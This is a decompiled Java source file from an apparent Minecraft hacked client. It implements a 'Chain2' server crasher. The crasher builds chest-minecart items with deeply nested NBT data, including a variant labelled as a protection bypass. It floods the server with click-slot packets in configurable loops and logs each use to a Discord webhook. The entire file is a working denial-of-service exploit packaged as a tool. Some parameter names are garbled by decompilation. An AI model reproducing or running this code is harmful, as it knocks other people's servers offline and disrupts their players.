package org.jon.magicclient.client.crashers;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.Arrays;
import java.util.List;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_2813;
import net.minecraft.class_310;
import org.jon.magicclient.client.Command;
import org.jon.magicclient.client.MessageHelper;
import org.jon.magicclient.client.gui.GuiCategory;
import org.jon.magicclient.client.utils.DiscordWebhookSender;
import org.jon.magicclient.client.utils.OptionType;
import org.jon.magicclient.client.utils.OptionUtil;

public class Magic2 implements Command {
   private boolean enabled = false;
   private final class_310 mc = class_310.method_1551();
   private final MessageHelper msgHelper = new MessageHelper();
   private final List<OptionUtil> options;

   public Magic2() {
      this.options = Arrays.asList(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Size", OptionType.INTEGER), new OptionUtil("Depth", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Minecart1", "Minecart2", "MinecartHeavy", "LPX_Bypass"}), new OptionUtil("ThreadSleep", OptionType.INTEGER), new OptionUtil("ThreadLoop", OptionType.INTEGER));
   }

   public void onMethod(String[] this) {
      int packets = Integer.parseInt(args[2]);
      int size = Integer.parseInt(args[3]);
      int depth = Integer.parseInt(args[4]);
      String type = args[5].toLowerCase();
      int threadSleep = args.length > 6 ? Integer.parseInt(args[6]) : 0;
      int threadLoop = args.length > 7 ? Integer.parseInt(args[7]) : 1;
      StringBuilder config = new StringBuilder();
      config.append("Packets=").append(packets).append(", Size=").append(size).append(", Depth=").append(depth).append(", Type=").append(type).append(", ThreadSleep=").append(threadSleep).append(", ThreadLoop=").append(threadLoop);
      DiscordWebhookSender.sendCrasherActivation("Chain2", config.toString());
      this.enabled = true;
      (new Thread(() -> {
         boolean success = false;

         try {
            int loop = 0;

            label246:
            while(true) {
               if (loop < threadLoop && this.enabled) {
                  if (this.mc.field_1724 != null && this.mc.method_1562() != null) {
                     if (loop > 0 && threadSleep > 0) {
                        Thread.sleep((long)threadSleep);
                     }

                     this.msgHelper.sendMessage("§a[Chain2] Loop " + (loop + 1) + "/" + threadLoop + " starting...", true);
                     int tmp1$ = -1;
                     switch(type.hashCode()) {
                     case -301876205:
                        if (type.equals("lpx_bypass")) {
                           tmp1$ = 3;
                        }
                        break;
                     case 504328884:
                        if (type.equals("minecartheavy")) {
                           tmp1$ = 2;
                        }
                        break;
                     case 694583454:
                        if (type.equals("minecart1")) {
                           tmp1$ = 0;
                        }
                        break;
                     case 694583455:
                        if (type.equals("minecart2")) {
                           tmp1$ = 1;
                        }
                     }

                     class_1799 stack;
                     switch(tmp1$) {
                     case 0:
                        stack = this.getMinecartStack1(size, depth);
                        break;
                     case 1:
                        stack = this.getMinecartStack2(size);
                        break;
                     case 2:
                        stack = this.getMinecartHeavyStack(size, depth);
                        break;
                     case 3:
                        stack = this.getLPXBypassStack(size, depth);
                        break;
                     default:
                        stack = this.getMinecartStack1(size, depth);
                     }

                     if (this.mc.field_1724 != null && this.mc.method_1562() != null) {
                        int sent = 0;
                        int i = 0;

                        while(true) {
                           if (i < packets && this.enabled) {
                              if (this.mc.field_1724 != null && this.mc.method_1562() != null) {
                                 if (this.mc.method_1562() != null) {
                                    try {
                                       this.mc.method_1562().method_2883(new class_2813(0, 0, 20, 0, class_1713.field_7793, stack, new Int2ObjectOpenHashMap()));
                                       ++sent;
                                    } catch (Exception var20) {
                                       if (var20.getMessage() != null && (var20.getMessage().contains("disconnected") || var20.getMessage().contains("connection") || var20.getMessage().contains("closed"))) {
                                          System.out.println("[Chain2] Disconnection detected - stopping crash");
                                          this.msgHelper.sendMessage("§c[Chain2] Stopped - disconnected from server", true);
                                          this.enabled = false;
                                          DiscordWebhookSender.sendCrasherCompletion("Chain2", config.toString(), false);
                                          return;
                                       }
                                    }
                                 }

                                 ++i;
                                 continue;
                              }

                              System.out.println("[Chain2] Connection lost during packet sending - stopping");
                              this.msgHelper.sendMessage("§c[Chain2] Stopped - connection lost", true);
                              this.enabled = false;
                              DiscordWebhookSender.sendCrasherCompletion("Chain2", config.toString(), false);
                              return;
                           }

                           this.msgHelper.sendMessage("§a[Chain2] Loop " + (loop + 1) + " sent " + sent + " packets", true);
                           ++loop;
                           continue label246;
                        }
                     }

                     this.msgHelper.sendMessage("§c[Chain2] Not connected to server!", true);
                     this.enabled = false;
                     DiscordWebhookSender.sendCrasherCompletion("Chain2", config.toString(), false);
                     return;
                  }

                  System.out.println("[Chain2] Player disconnected - stopping crash");
                  this.msgHelper.sendMessage("§c[Chain2] Stopped - disconnected from server", true);
                  this.enabled = false;
                  DiscordWebhookSender.sendCrasherCompletion("Chain2", config.toString(), false);
                  return;
               }

               success = true;
               return;
            }
         } catch (Exception var21) {
            this.msgHelper.sendMessage("§c[Chain2] Error: " + var21.getMessage(), true);
            success = false;
         } finally {
            this.enabled = false;
            this.msgHelper.sendMessage("§a[Chain2] Attack finished!", true);
            DiscordWebhookSender.sendCrasherCompletion("Chain2", config.toString(), success);
         }
      }, "Chain2-Thread")).start();
   }

   private class_1799 getLPXBypassStack(int this, int size) {
      class_2487 tag = new class_2487();
      class_2487 entityTag = new class_2487();
      class_2499 list = new class_2499();

      for(int i = 0; i < size; ++i) {
         class_2487 itemTag = new class_2487();
         itemTag.method_10582("id", "minecraft:stone");
         itemTag.method_10567("Count", (byte)1);
         class_2487 display = new class_2487();
         class_2499 lore = new class_2499();
         class_2487 nested = new class_2487();

         for(int j = 0; j < depth; ++j) {
            class_2487 next = new class_2487();
            next.method_10582("name", "val" + j);
            next.method_10569("id", j);
            nested.method_10566("node" + j, next);
         }

         display.method_10566("Lore", lore);
         display.method_10566("Extra", nested);
         itemTag.method_10566("tag", display);
         list.add(itemTag);
      }

      entityTag.method_10566("Items", list);
      entityTag.method_10582("id", "minecraft:chest_minecart");
      tag.method_10566("EntityTag", entityTag);
      class_1799 stack = new class_1799(class_1802.field_8388);
      stack.method_7980(tag);
      return stack;
   }

   private class_1799 getMinecartHeavyStack(int this, int size) {
      class_2487 tag = new class_2487();
      class_2487 entityTag = new class_2487();
      class_2499 list = new class_2499();

      for(int i = 0; i < size; ++i) {
         class_2487 entry = new class_2487();
         class_2487 nested = entry;

         for(int j = 0; j < depth; ++j) {
            class_2487 next = new class_2487();
            next.method_10566("data" + j, new class_2487());
            nested.method_10566("node" + j, next);
            nested = next;
         }

         list.add(entry);
      }

      entityTag.method_10566("Items", list);
      entityTag.method_10582("id", "minecraft:chest_minecart");
      tag.method_10566("EntityTag", entityTag);
      class_1799 stack = new class_1799(class_1802.field_8388);
      stack.method_7980(tag);
      return stack;
   }

   private class_1799 getMinecartStack1(int this, int size) {
      class_2487 compoundTag = new class_2487();
      class_2499 itemList = new class_2499();

      for(int i = 0; i < size; ++i) {
         class_2487 item = new class_2487();
         class_2487 current = item;

         for(int j = 0; j < depth; ++j) {
            class_2487 next = new class_2487();
            next.method_10566("n", new class_2487());
            current.method_10566("v", next);
            current = next;
         }

         item.method_10582("id", "minecraft:chest_minecart");
         itemList.add(item);
      }

      class_2487 entityTag = new class_2487();
      entityTag.method_10566("Items", itemList);
      compoundTag.method_10566("EntityTag", entityTag);
      class_1799 stack = new class_1799(class_1802.field_8388);
      stack.method_7980(compoundTag);
      return stack;
   }

   private class_1799 getMinecartStack2(int this) {
      class_2487 entityTag = new class_2487();
      class_2499 items = new class_2499();

      for(int i = 0; i < size; ++i) {
         items.add(new class_2487());
      }

      entityTag.method_10566("Items", items);
      class_1799 stack = new class_1799(class_1802.field_8388);
      class_2487 tag = new class_2487();
      tag.method_10566("EntityTag", entityTag);
      stack.method_7980(tag);
      return stack;
   }

   public String getName() {
      return "Chain2";
   }

   public boolean getEnabled() {
      return this.enabled;
   }

   public void setEnabled(boolean this) {
      this.enabled = bool;
   }

   public void onCommand(String[] this) {
      System.out.println("Chain2.onCommand called with args: " + Arrays.toString(args));
      int packets;
      int size;
      int depth;
      String type;
      int sleep;
      int loop;
      if (args.length == 0 || args.length == 1 || args.length >= 2 && (args[1] == null || args[1].isEmpty())) {
         try {
            packets = Integer.parseInt(((OptionUtil)this.options.get(0)).getValue().toString());
            size = Integer.parseInt(((OptionUtil)this.options.get(1)).getValue().toString());
            depth = Integer.parseInt(((OptionUtil)this.options.get(2)).getValue().toString());
            type = ((OptionUtil)this.options.get(3)).getValue().toString().toLowerCase();
            sleep = Integer.parseInt(((OptionUtil)this.options.get(4)).getValue().toString());
            loop = Integer.parseInt(((OptionUtil)this.options.get(5)).getValue().toString());
            System.out.println("Starting Chain2 from GUI: p=" + packets + ", s=" + size + ", d=" + depth + ", t=" + type);
            this.onMethod(new String[]{"", "", String.valueOf(packets), String.valueOf(size), String.valueOf(depth), type, String.valueOf(sleep), String.valueOf(loop)});
            return;
         } catch (Exception var11) {
            this.msgHelper.sendMessage("&cError applying options: " + var11.getMessage(), true);
            var11.printStackTrace();
         }
      }

      if (args.length < 5) {
         this.msgHelper.sendMessage("&7Usage: !Chain2 <packets> <size> <depth> <type> [sleep] [loop]", true);
      } else {
         try {
            packets = Integer.parseInt(args[1]);
            size = Integer.parseInt(args[2]);
            depth = Integer.parseInt(args[3]);
            type = args[4].toLowerCase();
            sleep = args.length > 5 ? Integer.parseInt(args[5]) : 0;
            loop = args.length > 6 ? Integer.parseInt(args[6]) : 1;
            this.onMethod(new String[]{"", "", String.valueOf(packets), String.valueOf(size), String.valueOf(depth), type, String.valueOf(sleep), String.valueOf(loop)});
         } catch (NumberFormatException var10) {
            this.msgHelper.sendMessage("&cInvalid numbers!", true);
         }

      }
   }

   public String getArgsUsage() {
      return "<packets> <size> <depth> <type> [sleep] [loop]";
   }

   public String getDescription() {
      return "Chain2 minecart crash";
   }

   public List<OptionUtil> getOptions() {
      return this.options;
   }

   public GuiCategory getCategory() {
      return GuiCategory.CRASHES;
   }
}
